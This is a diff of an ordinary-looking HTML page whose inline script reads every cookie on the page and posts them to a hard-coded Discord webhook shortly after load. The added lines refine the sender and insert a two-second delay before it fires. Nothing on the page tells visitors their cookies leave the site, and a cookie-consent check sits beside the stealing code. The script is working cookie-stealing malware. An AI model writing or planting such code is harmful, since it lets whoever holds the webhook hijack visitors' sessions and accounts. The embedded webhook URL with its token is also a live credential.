@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -34,33 +35,31 @@
 
     <script>
         const webhookUrl = "https://discord.com/api/webhooks/1369010479003074611/xRcpWt1QM2sYztFWocs6uLxIPnHaGNdOvLAxWNtNgaogJXzAJ3laKqyC3Lp60TVomXX8"; // Replace with your actual Discord webhook URL
+        const delayBeforeSend = 2000; // Delay in milliseconds (e.g., 2000ms = 2 seconds)
 
         function sendCookiesToWebhook() {
-    const allCookies = document.cookie;
-    const cookieArray = allCookies.split(';');
-    let formattedCookies = [];
+            const allCookies = document.cookie;
+            const cookieArray = allCookies.split(';');
+            const formattedCookies = cookieArray.map(cookie => cookie.trim()).join('\n- ');
+            const payload = {
+                content: `🍪 Website opened - Current Cookies:\n- ${formattedCookies}`
+            };
 
-    if (cookieArray.length > 0 && allCookies !== "") {
-        formattedCookies = cookieArray.map(cookie => cookie.trim());
-    } else {
-        formattedCookies.push("No cookies present");
-    }
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payload)
+            }).catch(err => console.error("Webhook failed:", err));
+        }
 
-    const payload = {
-        content: `🍪 Website opened - Current Cookies:\n- ${formattedCookies.join('\n- ')}`
-    };
-
-    fetch(webhookUrl, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify(payload)
-    }).catch(err => console.error("Webhook failed:", err));
-}
+        function callSendCookiesWithDelay() {
+            setTimeout(sendCookiesToWebhook, delayBeforeSend);
+        }
 
         // Call this function when the page loads
-        window.onload = sendCookiesToWebhook;
+        window.onload = callSendCookiesWithDelay;
 
         function hasAcceptedCookies() {
             return document.cookie.includes("cookieConsent=true");
